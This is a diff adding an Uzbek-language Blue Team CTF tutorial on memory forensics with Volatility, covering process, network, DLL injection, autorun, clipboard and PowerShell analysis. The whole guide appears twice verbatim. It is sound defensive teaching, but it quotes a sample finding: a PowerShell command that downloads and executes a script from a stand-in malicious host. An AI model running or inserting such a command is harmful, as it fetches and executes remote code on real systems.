@@ -1,0 +1,352 @@
+Volatility-ni Blue Team CTF-da Ishlatish
+
+Volatility - bu xotira dump-larini (RAM images) tahlil qilish uchun ishlatiladigan forensik vosita. Blue Team CTF da tajovuzkorlar tomonidan buzilgan tizimni tekshirish uchun ishlatilishi mumkin. Quyida Volatility yordamida xotira dumpini tahlil qilish va hujumni aniqlash usullari keltirilgan.
+
+
+---
+
+1. Volatility-ni O‘rnatish
+
+Agar Volatility 3 versiyasini ishlatmoqchi bo‘lsangiz, Python 3.6+ kerak bo‘ladi:
+
+git clone https://github.com/volatilityfoundation/volatility3.git
+cd volatility3
+pip install -r requirements.txt
+
+Keyin vol.py faylini ishga tushirish mumkin.
+
+Yoki: Volatility 2 versiyasini o‘rnatish
+
+sudo apt install volatility
+
+
+---
+
+2. Xotira Dump-ni Yuklash va Profilni Aniqlash
+
+Agar CTF da sizga RAM dump (memory image) berilgan bo‘lsa, uni yuklab olish va tekshirish kerak.
+
+vol.py -f memory.dmp imageinfo
+
+Bu buyruq operatsion tizim versiyasi va kernel profiling ni ko‘rsatadi.
+
+Masalan, natija shunday bo‘lishi mumkin:
+
+Suggested Profile(s) : Win10x64_19041, Win10x64_18362
+
+Demak, bu Windows 10 64-bit xotira dumpi.
+
+Agar Volatility 2 ishlatilayotgan bo‘lsa:
+
+volatility -f memory.dmp --profile=Win10x64_19041 imageinfo
+
+
+---
+
+3. Foydalanuvchi Sessiyalarini Tekshirish
+
+vol.py -f memory.dmp windows.sessions
+
+Bu buyruq foydalanuvchilar tomonidan yaratilgan sessiyalarni ko‘rsatadi.
+
+
+---
+
+4. Xotirada Yashirin Jarayonlarni (Malicious Processes) Aniqlash
+
+Tajovuzkorlar malware yoki backdoor jarayonlarini yashirish uchun Windows jarayonlarini buzishi mumkin.
+
+vol.py -f memory.dmp windows.pslist
+
+Bu buyruq tizimda ishlayotgan barcha jarayonlarni ko‘rsatadi.
+
+✅ Shubhali jarayonlarni aniqlash uchun:
+
+vol.py -f memory.dmp windows.psscan
+
+Bu yashirilgan yoki o‘chirilgan jarayonlarni topishga yordam beradi.
+
+✅ Jarayonlar orasida shubhali buyruqlarni izlash:
+
+vol.py -f memory.dmp windows.cmdline
+
+Agar tajovuzkor PowerShell yoki cmd orqali buyruqlar yuborgan bo‘lsa, bu orqali aniqlash mumkin.
+
+
+---
+
+5. Tarmoq Faoliyatini Tekshirish (C2 aloqalarini topish)
+
+Agar tajovuzkor C2 server bilan bog‘langan bo‘lsa, active network connections larni tekshirish kerak:
+
+vol.py -f memory.dmp windows.netscan
+
+✅ Natijani tahlil qilish:
+
+Shubhali IP-manzillar yoki portlar
+
+Noqonuniy aloqa ochilgan jarayonlar (EXE yoki DLL orqali)
+
+
+Masalan, agar shubhali 192.168.1.200:4444 manziliga ulanish mavjud bo‘lsa, bu reverse shell yoki Metasploit sessiyasi bo‘lishi mumkin.
+
+
+---
+
+6. DLL va Malicious Injectlarni Tekshirish
+
+Tajovuzkorlar o‘z malware-larini Windows jarayonlariga yuklashi (DLL injection) mumkin. Buni tekshirish uchun:
+
+vol.py -f memory.dmp windows.dlllist
+
+Bu jarayonlar tomonidan yuklangan barcha DLL-fayllarni ko‘rsatadi.
+
+✅ Yashirin DLL yoki shubhali yuklangan fayllarni topish:
+
+vol.py -f memory.dmp windows.malfind
+
+Agar tajovuzkor yashirin kod joylagan bo‘lsa, bu orqali uni topish mumkin.
+
+
+---
+
+7. Tajovuzkor O‘rnatgan Autostart Dasturlarini Topish
+
+vol.py -f memory.dmp windows.autoruns
+
+Bu buyruq Windows yuklash vaqtida avtomatik ishga tushadigan dasturlarni ko‘rsatadi.
+
+✅ CTF misol:
+Agar natijada quyidagi kabi shubhali natija chiqsa:
+
+HKLM\Software\Microsoft\Windows\CurrentVersion\Run -> malware.exe
+
+Bu tajovuzkor avtomatik ishga tushadigan zararli dastur joylaganini anglatadi.
+
+
+---
+
+8. Clipboard (Nusxalangan Ma’lumotlar) ni Tekshirish
+
+Agar tajovuzkor Clipboard’dan ma’lumotlarni o‘g‘irlagan bo‘lsa, buni Clipboard tahlili orqali aniqlash mumkin:
+
+vol.py -f memory.dmp windows.clipboard
+
+Masalan, natijada nusxalangan parollar yoki maxfiy ma’lumotlar chiqishi mumkin.
+
+
+---
+
+9. PowerShell Skriptlarini Tekshirish
+
+Agar tajovuzkor PowerShell orqali exploit ishlatgan bo‘lsa, bu buyruq orqali aniqlash mumkin:
+
+vol.py -f memory.dmp windows.powershell
+
+✅ CTF misol:
+
+Command: Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious.com/malware.ps1')
+
+Bu PowerShell orqali zararli skript yuklanganini ko‘rsatadi.
+
+
+---
+
+10. Hujumni Bartaraf Etish (Remediation Steps)
+
+Agar CTF savoli hujumni bartaraf etish haqida bo‘lsa, quyidagilarni qilish kerak:
+
+1️⃣ Tajovuzkor ishlatgan jarayonlarni aniqlash (pslist, psscan)
+2️⃣ Yashirin yoki shubhali tarmoq aloqalarini bloklash (netscan)
+3️⃣ Zararli DLL va injeksiyalarni topish (malfind, dlllist)
+4️⃣ Tajovuzkor tomonidan qo‘llangan PowerShell va buyruqlarni tahlil qilish (cmdline, powershell)
+5️⃣ Windows yuklashda ishlaydigan zararli fayllarni o‘chirish (autoruns)
+6️⃣ CTF flag yoki ma’lumotni olish uchun Clipboard va boshqa ma’lumotlarni tahlil qilish (clipboard)
+
+
+---
+
+🔴 Xulosa
+
+✅ Volatility CTF muhitida tahlil qilish uchun asosiy vositalardan biri
+✅ Hujumni qayta tiklash va jarayonlarni tushunish imkonini beradi
+✅ RAM tahlili orqali yashirin hujumlarni ochish mumkin
+
+Agar CTF savolida konkret misol yoki RAM dump bo‘lsa, uni batafsil tahlil qilib, qanday qilib flag olish mumkinligini ko‘rsatib berishim mumkin!
+
+Volatility-ni Blue Team CTF-da Ishlatish
+
+Volatility - bu xotira dump-larini (RAM images) tahlil qilish uchun ishlatiladigan forensik vosita. Blue Team CTF da tajovuzkorlar tomonidan buzilgan tizimni tekshirish uchun ishlatilishi mumkin. Quyida Volatility yordamida xotira dumpini tahlil qilish va hujumni aniqlash usullari keltirilgan.
+
+
+---
+
+1. Volatility-ni O‘rnatish
+
+Agar Volatility 3 versiyasini ishlatmoqchi bo‘lsangiz, Python 3.6+ kerak bo‘ladi:
+
+git clone https://github.com/volatilityfoundation/volatility3.git
+cd volatility3
+pip install -r requirements.txt
+
+Keyin vol.py faylini ishga tushirish mumkin.
+
+Yoki: Volatility 2 versiyasini o‘rnatish
+
+sudo apt install volatility
+
+
+---
+
+2. Xotira Dump-ni Yuklash va Profilni Aniqlash
+
+Agar CTF da sizga RAM dump (memory image) berilgan bo‘lsa, uni yuklab olish va tekshirish kerak.
+
+vol.py -f memory.dmp imageinfo
+
+Bu buyruq operatsion tizim versiyasi va kernel profiling ni ko‘rsatadi.
+
+Masalan, natija shunday bo‘lishi mumkin:
+
+Suggested Profile(s) : Win10x64_19041, Win10x64_18362
+
+Demak, bu Windows 10 64-bit xotira dumpi.
+
+Agar Volatility 2 ishlatilayotgan bo‘lsa:
+
+volatility -f memory.dmp --profile=Win10x64_19041 imageinfo
+
+
+---
+
+3. Foydalanuvchi Sessiyalarini Tekshirish
+
+vol.py -f memory.dmp windows.sessions
+
+Bu buyruq foydalanuvchilar tomonidan yaratilgan sessiyalarni ko‘rsatadi.
+
+
+---
+
+4. Xotirada Yashirin Jarayonlarni (Malicious Processes) Aniqlash
+
+Tajovuzkorlar malware yoki backdoor jarayonlarini yashirish uchun Windows jarayonlarini buzishi mumkin.
+
+vol.py -f memory.dmp windows.pslist
+
+Bu buyruq tizimda ishlayotgan barcha jarayonlarni ko‘rsatadi.
+
+✅ Shubhali jarayonlarni aniqlash uchun:
+
+vol.py -f memory.dmp windows.psscan
+
+Bu yashirilgan yoki o‘chirilgan jarayonlarni topishga yordam beradi.
+
+✅ Jarayonlar orasida shubhali buyruqlarni izlash:
+
+vol.py -f memory.dmp windows.cmdline
+
+Agar tajovuzkor PowerShell yoki cmd orqali buyruqlar yuborgan bo‘lsa, bu orqali aniqlash mumkin.
+
+
+---
+
+5. Tarmoq Faoliyatini Tekshirish (C2 aloqalarini topish)
+
+Agar tajovuzkor C2 server bilan bog‘langan bo‘lsa, active network connections larni tekshirish kerak:
+
+vol.py -f memory.dmp windows.netscan
+
+✅ Natijani tahlil qilish:
+
+Shubhali IP-manzillar yoki portlar
+
+Noqonuniy aloqa ochilgan jarayonlar (EXE yoki DLL orqali)
+
+
+Masalan, agar shubhali 192.168.1.200:4444 manziliga ulanish mavjud bo‘lsa, bu reverse shell yoki Metasploit sessiyasi bo‘lishi mumkin.
+
+
+---
+
+6. DLL va Malicious Injectlarni Tekshirish
+
+Tajovuzkorlar o‘z malware-larini Windows jarayonlariga yuklashi (DLL injection) mumkin. Buni tekshirish uchun:
+
+vol.py -f memory.dmp windows.dlllist
+
+Bu jarayonlar tomonidan yuklangan barcha DLL-fayllarni ko‘rsatadi.
+
+✅ Yashirin DLL yoki shubhali yuklangan fayllarni topish:
+
+vol.py -f memory.dmp windows.malfind
+
+Agar tajovuzkor yashirin kod joylagan bo‘lsa, bu orqali uni topish mumkin.
+
+
+---
+
+7. Tajovuzkor O‘rnatgan Autostart Dasturlarini Topish
+
+vol.py -f memory.dmp windows.autoruns
+
+Bu buyruq Windows yuklash vaqtida avtomatik ishga tushadigan dasturlarni ko‘rsatadi.
+
+✅ CTF misol:
+Agar natijada quyidagi kabi shubhali natija chiqsa:
+
+HKLM\Software\Microsoft\Windows\CurrentVersion\Run -> malware.exe
+
+Bu tajovuzkor avtomatik ishga tushadigan zararli dastur joylaganini anglatadi.
+
+
+---
+
+8. Clipboard (Nusxalangan Ma’lumotlar) ni Tekshirish
+
+Agar tajovuzkor Clipboard’dan ma’lumotlarni o‘g‘irlagan bo‘lsa, buni Clipboard tahlili orqali aniqlash mumkin:
+
+vol.py -f memory.dmp windows.clipboard
+
+Masalan, natijada nusxalangan parollar yoki maxfiy ma’lumotlar chiqishi mumkin.
+
+
+---
+
+9. PowerShell Skriptlarini Tekshirish
+
+Agar tajovuzkor PowerShell orqali exploit ishlatgan bo‘lsa, bu buyruq orqali aniqlash mumkin:
+
+vol.py -f memory.dmp windows.powershell
+
+✅ CTF misol:
+
+Command: Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious.com/malware.ps1')
+
+Bu PowerShell orqali zararli skript yuklanganini ko‘rsatadi.
+
+
+---
+
+10. Hujumni Bartaraf Etish (Remediation Steps)
+
+Agar CTF savoli hujumni bartaraf etish haqida bo‘lsa, quyidagilarni qilish kerak:
+
+1️⃣ Tajovuzkor ishlatgan jarayonlarni aniqlash (pslist, psscan)
+2️⃣ Yashirin yoki shubhali tarmoq aloqalarini bloklash (netscan)
+3️⃣ Zararli DLL va injeksiyalarni topish (malfind, dlllist)
+4️⃣ Tajovuzkor tomonidan qo‘llangan PowerShell va buyruqlarni tahlil qilish (cmdline, powershell)
+5️⃣ Windows yuklashda ishlaydigan zararli fayllarni o‘chirish (autoruns)
+6️⃣ CTF flag yoki ma’lumotni olish uchun Clipboard va boshqa ma’lumotlarni tahlil qilish (clipboard)
+
+
+---
+
+🔴 Xulosa
+
+✅ Volatility CTF muhitida tahlil qilish uchun asosiy vositalardan biri
+✅ Hujumni qayta tiklash va jarayonlarni tushunish imkonini beradi
+✅ RAM tahlili orqali yashirin hujumlarni ochish mumkin
+
+Agar CTF savolida konkret misol yoki RAM dump bo‘lsa, uni batafsil tahlil qilib, qanday qilib flag olish mumkinligini ko‘rsatib berishim mumkin!
+
